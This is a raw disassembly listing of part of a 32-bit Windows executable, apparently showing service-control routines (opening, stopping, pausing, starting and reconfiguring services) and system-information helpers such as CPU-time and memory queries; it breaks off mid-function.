  40a94c:	85 c0                	test   %eax,%eax
  40a94e:	56                   	push   %esi
  40a94f:	8b 35 70 d0 40 00    	mov    0x40d070,%esi
  40a955:	0f 95 c3             	setne  %bl
  40a958:	ff d6                	call   *%esi
  40a95a:	57                   	push   %edi
  40a95b:	ff d6                	call   *%esi
  40a95d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a960:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a966:	5f                   	pop    %edi
  40a967:	8a c3                	mov    %bl,%al
  40a969:	5e                   	pop    %esi
  40a96a:	5b                   	pop    %ebx
  40a96b:	5d                   	pop    %ebp
  40a96c:	c3                   	ret
  40a96d:	55                   	push   %ebp
  40a96e:	8b ec                	mov    %esp,%ebp
  40a970:	83 ec 1c             	sub    $0x1c,%esp
  40a973:	53                   	push   %ebx
  40a974:	56                   	push   %esi
  40a975:	57                   	push   %edi
  40a976:	33 db                	xor    %ebx,%ebx
  40a978:	6a 20                	push   $0x20
  40a97a:	53                   	push   %ebx
  40a97b:	53                   	push   %ebx
  40a97c:	ff 15 18 d0 40 00    	call   *0x40d018
  40a982:	6a 20                	push   $0x20
  40a984:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a987:	8b f0                	mov    %eax,%esi
  40a989:	ff 15 98 d2 40 00    	call   *0x40d298
  40a98f:	50                   	push   %eax
  40a990:	56                   	push   %esi
  40a991:	ff 15 28 d0 40 00    	call   *0x40d028
  40a997:	8b f8                	mov    %eax,%edi
  40a999:	3b fb                	cmp    %ebx,%edi
  40a99b:	75 09                	jne    0x40a9a6
  40a99d:	56                   	push   %esi
  40a99e:	ff 15 70 d0 40 00    	call   *0x40d070
  40a9a4:	eb 1e                	jmp    0x40a9c4
  40a9a6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40a9a9:	50                   	push   %eax
  40a9aa:	6a 01                	push   $0x1
  40a9ac:	57                   	push   %edi
  40a9ad:	ff 15 14 d0 40 00    	call   *0x40d014
  40a9b3:	85 c0                	test   %eax,%eax
  40a9b5:	56                   	push   %esi
  40a9b6:	8b 35 70 d0 40 00    	mov    0x40d070,%esi
  40a9bc:	0f 95 c3             	setne  %bl
  40a9bf:	ff d6                	call   *%esi
  40a9c1:	57                   	push   %edi
  40a9c2:	ff d6                	call   *%esi
  40a9c4:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a9c7:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a9cd:	5f                   	pop    %edi
  40a9ce:	8a c3                	mov    %bl,%al
  40a9d0:	5e                   	pop    %esi
  40a9d1:	5b                   	pop    %ebx
  40a9d2:	c9                   	leave
  40a9d3:	c3                   	ret
  40a9d4:	55                   	push   %ebp
  40a9d5:	8b ec                	mov    %esp,%ebp
  40a9d7:	83 ec 1c             	sub    $0x1c,%esp
  40a9da:	53                   	push   %ebx
  40a9db:	56                   	push   %esi
  40a9dc:	57                   	push   %edi
  40a9dd:	33 db                	xor    %ebx,%ebx
  40a9df:	6a 11                	push   $0x11
  40a9e1:	53                   	push   %ebx
  40a9e2:	53                   	push   %ebx
  40a9e3:	ff 15 18 d0 40 00    	call   *0x40d018
  40a9e9:	68 3f 00 0f 00       	push   $0xf003f
  40a9ee:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a9f1:	8b f0                	mov    %eax,%esi
  40a9f3:	ff 15 98 d2 40 00    	call   *0x40d298
  40a9f9:	50                   	push   %eax
  40a9fa:	56                   	push   %esi
  40a9fb:	ff 15 28 d0 40 00    	call   *0x40d028
  40aa01:	8b f8                	mov    %eax,%edi
  40aa03:	3b fb                	cmp    %ebx,%edi
  40aa05:	75 09                	jne    0x40aa10
  40aa07:	56                   	push   %esi
  40aa08:	ff 15 70 d0 40 00    	call   *0x40d070
  40aa0e:	eb 46                	jmp    0x40aa56
  40aa10:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40aa13:	50                   	push   %eax
  40aa14:	6a 01                	push   $0x1
  40aa16:	57                   	push   %edi
  40aa17:	ff 15 14 d0 40 00    	call   *0x40d014
  40aa1d:	85 c0                	test   %eax,%eax
  40aa1f:	75 04                	jne    0x40aa25
  40aa21:	b3 02                	mov    $0x2,%bl
  40aa23:	eb 25                	jmp    0x40aa4a
  40aa25:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40aa28:	50                   	push   %eax
  40aa29:	57                   	push   %edi
  40aa2a:	ff 15 10 d0 40 00    	call   *0x40d010
  40aa30:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  40aa34:	75 ef                	jne    0x40aa25
  40aa36:	53                   	push   %ebx
  40aa37:	53                   	push   %ebx
  40aa38:	57                   	push   %edi
  40aa39:	ff 15 1c d0 40 00    	call   *0x40d01c
  40aa3f:	f7 d8                	neg    %eax
  40aa41:	1b c0                	sbb    %eax,%eax
  40aa43:	24 fe                	and    $0xfe,%al
  40aa45:	83 c0 03             	add    $0x3,%eax
  40aa48:	8a d8                	mov    %al,%bl
  40aa4a:	56                   	push   %esi
  40aa4b:	8b 35 70 d0 40 00    	mov    0x40d070,%esi
  40aa51:	ff d6                	call   *%esi
  40aa53:	57                   	push   %edi
  40aa54:	ff d6                	call   *%esi
  40aa56:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40aa59:	ff 15 9c d2 40 00    	call   *0x40d29c
  40aa5f:	5f                   	pop    %edi
  40aa60:	8a c3                	mov    %bl,%al
  40aa62:	5e                   	pop    %esi
  40aa63:	5b                   	pop    %ebx
  40aa64:	c9                   	leave
  40aa65:	c3                   	ret
  40aa66:	55                   	push   %ebp
  40aa67:	8b ec                	mov    %esp,%ebp
  40aa69:	83 ec 1c             	sub    $0x1c,%esp
  40aa6c:	53                   	push   %ebx
  40aa6d:	56                   	push   %esi
  40aa6e:	57                   	push   %edi
  40aa6f:	33 db                	xor    %ebx,%ebx
  40aa71:	6a 40                	push   $0x40
  40aa73:	53                   	push   %ebx
  40aa74:	53                   	push   %ebx
  40aa75:	ff 15 18 d0 40 00    	call   *0x40d018
  40aa7b:	6a 40                	push   $0x40
  40aa7d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40aa80:	8b f0                	mov    %eax,%esi
  40aa82:	ff 15 98 d2 40 00    	call   *0x40d298
  40aa88:	50                   	push   %eax
  40aa89:	56                   	push   %esi
  40aa8a:	ff 15 28 d0 40 00    	call   *0x40d028
  40aa90:	8b f8                	mov    %eax,%edi
  40aa92:	3b fb                	cmp    %ebx,%edi
  40aa94:	75 09                	jne    0x40aa9f
  40aa96:	56                   	push   %esi
  40aa97:	ff 15 70 d0 40 00    	call   *0x40d070
  40aa9d:	eb 1e                	jmp    0x40aabd
  40aa9f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40aaa2:	50                   	push   %eax
  40aaa3:	6a 02                	push   $0x2
  40aaa5:	57                   	push   %edi
  40aaa6:	ff 15 14 d0 40 00    	call   *0x40d014
  40aaac:	85 c0                	test   %eax,%eax
  40aaae:	56                   	push   %esi
  40aaaf:	8b 35 70 d0 40 00    	mov    0x40d070,%esi
  40aab5:	0f 95 c3             	setne  %bl
  40aab8:	ff d6                	call   *%esi
  40aaba:	57                   	push   %edi
  40aabb:	ff d6                	call   *%esi
  40aabd:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40aac0:	ff 15 9c d2 40 00    	call   *0x40d29c
  40aac6:	5f                   	pop    %edi
  40aac7:	8a c3                	mov    %bl,%al
  40aac9:	5e                   	pop    %esi
  40aaca:	5b                   	pop    %ebx
  40aacb:	c9                   	leave
  40aacc:	c3                   	ret
  40aacd:	55                   	push   %ebp
  40aace:	8b ec                	mov    %esp,%ebp
  40aad0:	83 ec 1c             	sub    $0x1c,%esp
  40aad3:	53                   	push   %ebx
  40aad4:	56                   	push   %esi
  40aad5:	57                   	push   %edi
  40aad6:	33 db                	xor    %ebx,%ebx
  40aad8:	6a 40                	push   $0x40
  40aada:	53                   	push   %ebx
  40aadb:	53                   	push   %ebx
  40aadc:	ff 15 18 d0 40 00    	call   *0x40d018
  40aae2:	6a 40                	push   $0x40
  40aae4:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40aae7:	8b f0                	mov    %eax,%esi
  40aae9:	ff 15 98 d2 40 00    	call   *0x40d298
  40aaef:	50                   	push   %eax
  40aaf0:	56                   	push   %esi
  40aaf1:	ff 15 28 d0 40 00    	call   *0x40d028
  40aaf7:	8b f8                	mov    %eax,%edi
  40aaf9:	3b fb                	cmp    %ebx,%edi
  40aafb:	75 09                	jne    0x40ab06
  40aafd:	56                   	push   %esi
  40aafe:	ff 15 70 d0 40 00    	call   *0x40d070
  40ab04:	eb 1e                	jmp    0x40ab24
  40ab06:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40ab09:	50                   	push   %eax
  40ab0a:	6a 03                	push   $0x3
  40ab0c:	57                   	push   %edi
  40ab0d:	ff 15 14 d0 40 00    	call   *0x40d014
  40ab13:	85 c0                	test   %eax,%eax
  40ab15:	56                   	push   %esi
  40ab16:	8b 35 70 d0 40 00    	mov    0x40d070,%esi
  40ab1c:	0f 95 c3             	setne  %bl
  40ab1f:	ff d6                	call   *%esi
  40ab21:	57                   	push   %edi
  40ab22:	ff d6                	call   *%esi
  40ab24:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40ab27:	ff 15 9c d2 40 00    	call   *0x40d29c
  40ab2d:	5f                   	pop    %edi
  40ab2e:	8a c3                	mov    %bl,%al
  40ab30:	5e                   	pop    %esi
  40ab31:	5b                   	pop    %ebx
  40ab32:	c9                   	leave
  40ab33:	c3                   	ret
  40ab34:	55                   	push   %ebp
  40ab35:	8b ec                	mov    %esp,%ebp
  40ab37:	53                   	push   %ebx
  40ab38:	56                   	push   %esi
  40ab39:	57                   	push   %edi
  40ab3a:	33 db                	xor    %ebx,%ebx
  40ab3c:	6a 02                	push   $0x2
  40ab3e:	53                   	push   %ebx
  40ab3f:	53                   	push   %ebx
  40ab40:	ff 15 18 d0 40 00    	call   *0x40d018
  40ab46:	6a 02                	push   $0x2
  40ab48:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40ab4b:	8b f0                	mov    %eax,%esi
  40ab4d:	ff 15 98 d2 40 00    	call   *0x40d298
  40ab53:	50                   	push   %eax
  40ab54:	56                   	push   %esi
  40ab55:	ff 15 28 d0 40 00    	call   *0x40d028
  40ab5b:	8b f8                	mov    %eax,%edi
  40ab5d:	3b fb                	cmp    %ebx,%edi
  40ab5f:	75 09                	jne    0x40ab6a
  40ab61:	56                   	push   %esi
  40ab62:	ff 15 70 d0 40 00    	call   *0x40d070
  40ab68:	eb 40                	jmp    0x40abaa
  40ab6a:	0f b6 45 18          	movzbl 0x18(%ebp),%eax
  40ab6e:	83 c9 ff             	or     $0xffffffff,%ecx
  40ab71:	2b c3                	sub    %ebx,%eax
  40ab73:	74 0e                	je     0x40ab83
  40ab75:	48                   	dec    %eax
  40ab76:	74 07                	je     0x40ab7f
  40ab78:	48                   	dec    %eax
  40ab79:	75 0b                	jne    0x40ab86
  40ab7b:	6a 03                	push   $0x3
  40ab7d:	eb 06                	jmp    0x40ab85
  40ab7f:	6a 02                	push   $0x2
  40ab81:	eb 02                	jmp    0x40ab85
  40ab83:	6a 04                	push   $0x4
  40ab85:	59                   	pop    %ecx
  40ab86:	53                   	push   %ebx
  40ab87:	53                   	push   %ebx
  40ab88:	53                   	push   %ebx
  40ab89:	53                   	push   %ebx
  40ab8a:	53                   	push   %ebx
  40ab8b:	53                   	push   %ebx
  40ab8c:	53                   	push   %ebx
  40ab8d:	6a ff                	push   $0xffffffff
  40ab8f:	51                   	push   %ecx
  40ab90:	6a ff                	push   $0xffffffff
  40ab92:	57                   	push   %edi
  40ab93:	ff 15 0c d0 40 00    	call   *0x40d00c
  40ab99:	85 c0                	test   %eax,%eax
  40ab9b:	56                   	push   %esi
  40ab9c:	8b 35 70 d0 40 00    	mov    0x40d070,%esi
  40aba2:	0f 95 c3             	setne  %bl
  40aba5:	ff d6                	call   *%esi
  40aba7:	57                   	push   %edi
  40aba8:	ff d6                	call   *%esi
  40abaa:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40abad:	ff 15 9c d2 40 00    	call   *0x40d29c
  40abb3:	5f                   	pop    %edi
  40abb4:	8a c3                	mov    %bl,%al
  40abb6:	5e                   	pop    %esi
  40abb7:	5b                   	pop    %ebx
  40abb8:	5d                   	pop    %ebp
  40abb9:	c3                   	ret
  40abba:	55                   	push   %ebp
  40abbb:	8b ec                	mov    %esp,%ebp
  40abbd:	e8 c9 6f ff ff       	call   0x401b8b
  40abc2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40abc5:	c1 e1 04             	shl    $0x4,%ecx
  40abc8:	03 c1                	add    %ecx,%eax
  40abca:	5d                   	pop    %ebp
  40abcb:	c2 04 00             	ret    $0x4
  40abce:	e9 00 00 00 00       	jmp    0x40abd3
  40abd3:	68 38 de 40 00       	push   $0x40de38
  40abd8:	68 f0 dd 40 00       	push   $0x40ddf0
  40abdd:	ff 15 24 d1 40 00    	call   *0x40d124
  40abe3:	50                   	push   %eax
  40abe4:	ff 15 28 d1 40 00    	call   *0x40d128
  40abea:	a3 58 1d 41 00       	mov    %eax,0x411d58
  40abef:	c3                   	ret
  40abf0:	55                   	push   %ebp
  40abf1:	8b ec                	mov    %esp,%ebp
  40abf3:	83 ec 50             	sub    $0x50,%esp
  40abf6:	80 3d 18 1a 41 00 00 	cmpb   $0x0,0x411a18
  40abfd:	0f 84 9e 00 00 00    	je     0x40aca1
  40ac03:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ac06:	50                   	push   %eax
  40ac07:	ff 15 98 d1 40 00    	call   *0x40d198
  40ac0d:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  40ac11:	50                   	push   %eax
  40ac12:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  40ac16:	50                   	push   %eax
  40ac17:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  40ac1b:	50                   	push   %eax
  40ac1c:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  40ac20:	50                   	push   %eax
  40ac21:	8d 45 18             	lea    0x18(%ebp),%eax
  40ac24:	68 c8 d5 40 00       	push   $0x40d5c8
  40ac29:	50                   	push   %eax
  40ac2a:	8d 45 08             	lea    0x8(%ebp),%eax
  40ac2d:	68 64 de 40 00       	push   $0x40de64
  40ac32:	50                   	push   %eax
  40ac33:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40ac36:	68 4c de 40 00       	push   $0x40de4c
  40ac3b:	50                   	push   %eax
  40ac3c:	e8 83 1a 00 00       	call   0x40c6c4
  40ac41:	83 c4 0c             	add    $0xc,%esp
  40ac44:	50                   	push   %eax
  40ac45:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40ac48:	50                   	push   %eax
  40ac49:	e8 52 1a 00 00       	call   0x40c6a0
  40ac4e:	83 c4 0c             	add    $0xc,%esp
  40ac51:	50                   	push   %eax
  40ac52:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40ac55:	50                   	push   %eax
  40ac56:	e8 5d 1a 00 00       	call   0x40c6b8
  40ac5b:	83 c4 0c             	add    $0xc,%esp
  40ac5e:	50                   	push   %eax
  40ac5f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ac62:	50                   	push   %eax
  40ac63:	e8 38 1a 00 00       	call   0x40c6a0
  40ac68:	83 c4 0c             	add    $0xc,%esp
  40ac6b:	8b c8                	mov    %eax,%ecx
  40ac6d:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40ac73:	50                   	push   %eax
  40ac74:	ff 15 74 d3 40 00    	call   *0x40d374
  40ac7a:	83 c4 14             	add    $0x14,%esp
  40ac7d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40ac80:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40ac86:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40ac89:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40ac8f:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40ac92:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40ac98:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40ac9b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40aca1:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40aca4:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40acaa:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40acad:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40acb3:	c9                   	leave
  40acb4:	c3                   	ret
  40acb5:	55                   	push   %ebp
  40acb6:	8b ec                	mov    %esp,%ebp
  40acb8:	81 ec 1c 02 00 00    	sub    $0x21c,%esp
  40acbe:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
  40acc4:	68 04 01 00 00       	push   $0x104
  40acc9:	50                   	push   %eax
  40acca:	6a 00                	push   $0x0
  40accc:	ff 15 1c d1 40 00    	call   *0x40d11c
  40acd2:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40acd5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40acd8:	50                   	push   %eax
  40acd9:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
  40acdf:	50                   	push   %eax
  40ace0:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40ace6:	a1 40 d2 40 00       	mov    0x40d240,%eax
  40aceb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40acee:	ff 30                	push   (%eax)
  40acf0:	68 68 de 40 00       	push   $0x40de68
  40acf5:	ff 15 c8 d1 40 00    	call   *0x40d1c8
  40acfb:	50                   	push   %eax
  40acfc:	6a 00                	push   $0x0
  40acfe:	ff 75 08             	push   0x8(%ebp)
  40ad01:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40ad04:	ff 15 3c d2 40 00    	call   *0x40d23c
  40ad0a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40ad0d:	ff 15 9c d2 40 00    	call   *0x40d29c
  40ad13:	8b 45 08             	mov    0x8(%ebp),%eax
  40ad16:	c9                   	leave
  40ad17:	c3                   	ret
  40ad18:	55                   	push   %ebp
  40ad19:	8b ec                	mov    %esp,%ebp
  40ad1b:	81 ec 4c 02 00 00    	sub    $0x24c,%esp
  40ad21:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40ad24:	c7 45 f8 10 00 00 00 	movl   $0x10,-0x8(%ebp)
  40ad2b:	50                   	push   %eax
  40ad2c:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40ad2f:	50                   	push   %eax
  40ad30:	6a 01                	push   $0x1
  40ad32:	ff 15 64 1d 41 00    	call   *0x411d64
  40ad38:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40ad3b:	c7 45 f4 00 01 00 00 	movl   $0x100,-0xc(%ebp)
  40ad42:	50                   	push   %eax
  40ad43:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40ad49:	50                   	push   %eax
  40ad4a:	ff 15 08 d0 40 00    	call   *0x40d008
  40ad50:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40ad56:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40ad59:	50                   	push   %eax
  40ad5a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40ad5d:	50                   	push   %eax
  40ad5e:	68 70 de 40 00       	push   $0x40de70
  40ad63:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40ad69:	50                   	push   %eax
  40ad6a:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40ad6d:	50                   	push   %eax
  40ad6e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40ad71:	50                   	push   %eax
  40ad72:	e8 65 19 00 00       	call   0x40c6dc
  40ad77:	83 c4 0c             	add    $0xc,%esp
  40ad7a:	50                   	push   %eax
  40ad7b:	ff 75 08             	push   0x8(%ebp)
  40ad7e:	e8 47 19 00 00       	call   0x40c6ca
  40ad83:	83 c4 0c             	add    $0xc,%esp
  40ad86:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40ad89:	ff 15 9c d2 40 00    	call   *0x40d29c
  40ad8f:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40ad92:	ff 15 9c d2 40 00    	call   *0x40d29c
  40ad98:	8b 45 08             	mov    0x8(%ebp),%eax
  40ad9b:	c9                   	leave
  40ad9c:	c3                   	ret
  40ad9d:	55                   	push   %ebp
  40ad9e:	8b ec                	mov    %esp,%ebp
  40ada0:	83 ec 40             	sub    $0x40,%esp
  40ada3:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40ada6:	c7 45 c0 40 00 00 00 	movl   $0x40,-0x40(%ebp)
  40adad:	50                   	push   %eax
  40adae:	ff 15 14 1a 41 00    	call   *0x411a14
  40adb4:	8b 55 08             	mov    0x8(%ebp),%edx
  40adb7:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40adba:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40adbd:	89 02                	mov    %eax,(%edx)
  40adbf:	2b 45 d0             	sub    -0x30(%ebp),%eax
  40adc2:	89 4a 04             	mov    %ecx,0x4(%edx)
  40adc5:	8b 55 0c             	mov    0xc(%ebp),%edx
  40adc8:	1b 4d d4             	sbb    -0x2c(%ebp),%ecx
  40adcb:	89 02                	mov    %eax,(%edx)
  40adcd:	89 4a 04             	mov    %ecx,0x4(%edx)
  40add0:	c9                   	leave
  40add1:	c3                   	ret
  40add2:	55                   	push   %ebp
  40add3:	8b ec                	mov    %esp,%ebp
  40add5:	83 ec 40             	sub    $0x40,%esp
  40add8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40addb:	c7 45 c0 40 00 00 00 	movl   $0x40,-0x40(%ebp)
  40ade2:	50                   	push   %eax
  40ade3:	ff 15 14 1a 41 00    	call   *0x411a14
  40ade9:	8b 45 08             	mov    0x8(%ebp),%eax
  40adec:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40adef:	89 08                	mov    %ecx,(%eax)
  40adf1:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40adf4:	89 48 04             	mov    %ecx,0x4(%eax)
  40adf7:	c9                   	leave
  40adf8:	c3                   	ret
  40adf9:	55                   	push   %ebp
  40adfa:	8b ec                	mov    %esp,%ebp
  40adfc:	51                   	push   %ecx
  40adfd:	51                   	push   %ecx
  40adfe:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40ae02:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40ae06:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40ae09:	50                   	push   %eax
  40ae0a:	e8 c3 ff ff ff       	call   0x40add2
  40ae0f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40ae12:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ae15:	59                   	pop    %ecx
  40ae16:	c9                   	leave
  40ae17:	c3                   	ret
  40ae18:	55                   	push   %ebp
  40ae19:	8b ec                	mov    %esp,%ebp
  40ae1b:	83 ec 50             	sub    $0x50,%esp
  40ae1e:	53                   	push   %ebx
  40ae1f:	56                   	push   %esi
  40ae20:	57                   	push   %edi
  40ae21:	68 74 de 40 00       	push   $0x40de74
  40ae26:	68 78 db 40 00       	push   $0x40db78
  40ae2b:	ff 15 0c d1 40 00    	call   *0x40d10c
  40ae31:	50                   	push   %eax
  40ae32:	ff 15 28 d1 40 00    	call   *0x40d128
  40ae38:	8b f0                	mov    %eax,%esi
  40ae3a:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40ae3d:	50                   	push   %eax
  40ae3e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40ae41:	50                   	push   %eax
  40ae42:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40ae45:	50                   	push   %eax
  40ae46:	ff d6                	call   *%esi
  40ae48:	68 e8 03 00 00       	push   $0x3e8
  40ae4d:	ff 15 94 d1 40 00    	call   *0x40d194
  40ae53:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40ae56:	50                   	push   %eax
  40ae57:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40ae5a:	50                   	push   %eax
  40ae5b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40ae5e:	50                   	push   %eax
  40ae5f:	ff d6                	call   *%esi
  40ae61:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40ae64:	50                   	push   %eax
  40ae65:	e8 92 00 00 00       	call   0x40aefc
  40ae6a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40ae6d:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40ae70:	50                   	push   %eax
  40ae71:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40ae74:	e8 83 00 00 00       	call   0x40aefc
  40ae79:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40ae7c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40ae7f:	50                   	push   %eax
  40ae80:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40ae83:	e8 74 00 00 00       	call   0x40aefc
  40ae88:	8b d8                	mov    %eax,%ebx
  40ae8a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40ae8d:	50                   	push   %eax
  40ae8e:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40ae91:	e8 66 00 00 00       	call   0x40aefc
  40ae96:	8b f0                	mov    %eax,%esi
  40ae98:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40ae9b:	50                   	push   %eax
  40ae9c:	8b fa                	mov    %edx,%edi
  40ae9e:	e8 59 00 00 00       	call   0x40aefc
  40aea3:	2b f3                	sub    %ebx,%esi
  40aea5:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40aea8:	1b 7d e4             	sbb    -0x1c(%ebp),%edi
  40aeab:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40aeae:	50                   	push   %eax
  40aeaf:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40aeb2:	8b de                	mov    %esi,%ebx
  40aeb4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40aeb7:	e8 40 00 00 00       	call   0x40aefc
  40aebc:	8b f0                	mov    %eax,%esi
  40aebe:	83 c4 18             	add    $0x18,%esp
  40aec1:	2b 75 f8             	sub    -0x8(%ebp),%esi
  40aec4:	8b fa                	mov    %edx,%edi
  40aec6:	6a 00                	push   $0x0
  40aec8:	6a 64                	push   $0x64
  40aeca:	1b 7d fc             	sbb    -0x4(%ebp),%edi
  40aecd:	8b c6                	mov    %esi,%eax
  40aecf:	2b 45 f0             	sub    -0x10(%ebp),%eax
  40aed2:	8b cf                	mov    %edi,%ecx
  40aed4:	1b 4d f4             	sbb    -0xc(%ebp),%ecx
  40aed7:	03 c3                	add    %ebx,%eax
  40aed9:	13 4d e4             	adc    -0x1c(%ebp),%ecx
  40aedc:	03 45 e8             	add    -0x18(%ebp),%eax
  40aedf:	13 4d ec             	adc    -0x14(%ebp),%ecx
  40aee2:	51                   	push   %ecx
  40aee3:	50                   	push   %eax
  40aee4:	e8 e7 15 00 00       	call   0x40c4d0
  40aee9:	03 f3                	add    %ebx,%esi
  40aeeb:	13 7d e4             	adc    -0x1c(%ebp),%edi
  40aeee:	57                   	push   %edi
  40aeef:	56                   	push   %esi
  40aef0:	52                   	push   %edx
  40aef1:	50                   	push   %eax
  40aef2:	e8 69 15 00 00       	call   0x40c460
  40aef7:	5f                   	pop    %edi
  40aef8:	5e                   	pop    %esi
  40aef9:	5b                   	pop    %ebx
  40aefa:	c9                   	leave
  40aefb:	c3                   	ret
  40aefc:	55                   	push   %ebp
  40aefd:	8b ec                	mov    %esp,%ebp
  40aeff:	51                   	push   %ecx
  40af00:	51                   	push   %ecx
  40af01:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40af04:	57                   	push   %edi
  40af05:	33 c0                	xor    %eax,%eax
  40af07:	8d 7d fc             	lea    -0x4(%ebp),%edi
  40af0a:	ab                   	stos   %eax,%es:(%edi)
  40af0b:	8b 01                	mov    (%ecx),%eax
  40af0d:	8b 49 04             	mov    0x4(%ecx),%ecx
  40af10:	8b d1                	mov    %ecx,%edx
  40af12:	5f                   	pop    %edi
  40af13:	c9                   	leave
  40af14:	c3                   	ret
  40af15:	55                   	push   %ebp
  40af16:	8b ec                	mov    %esp,%ebp
  40af18:	83 ec 58             	sub    $0x58,%esp
  40af1b:	83 4d e8 ff          	orl    $0xffffffff,-0x18(%ebp)
  40af1f:	53                   	push   %ebx
  40af20:	56                   	push   %esi
  40af21:	57                   	push   %edi
  40af22:	33 c0                	xor    %eax,%eax
  40af24:	8d 7d ec             	lea    -0x14(%ebp),%edi
  40af27:	ab                   	stos   %eax,%es:(%edi)
  40af28:	ab                   	stos   %eax,%es:(%edi)
  40af29:	ab                   	stos   %eax,%es:(%edi)
  40af2a:	be 00 00 00 80       	mov    $0x80000000,%esi
  40af2f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40af32:	56                   	push   %esi
  40af33:	50                   	push   %eax
  40af34:	e8 75 00 00 00       	call   0x40afae
  40af39:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40af3c:	59                   	pop    %ecx
  40af3d:	59                   	pop    %ecx
  40af3e:	33 c0                	xor    %eax,%eax
  40af40:	6a 10                	push   $0x10
  40af42:	8d 7d a8             	lea    -0x58(%ebp),%edi
  40af45:	59                   	pop    %ecx
  40af46:	3b d6                	cmp    %esi,%edx
  40af48:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40af4b:	8b de                	mov    %esi,%ebx
  40af4d:	f3 ab                	rep stos %eax,%es:(%edi)
  40af4f:	72 44                	jb     0x40af95
  40af51:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40af54:	53                   	push   %ebx
  40af55:	50                   	push   %eax
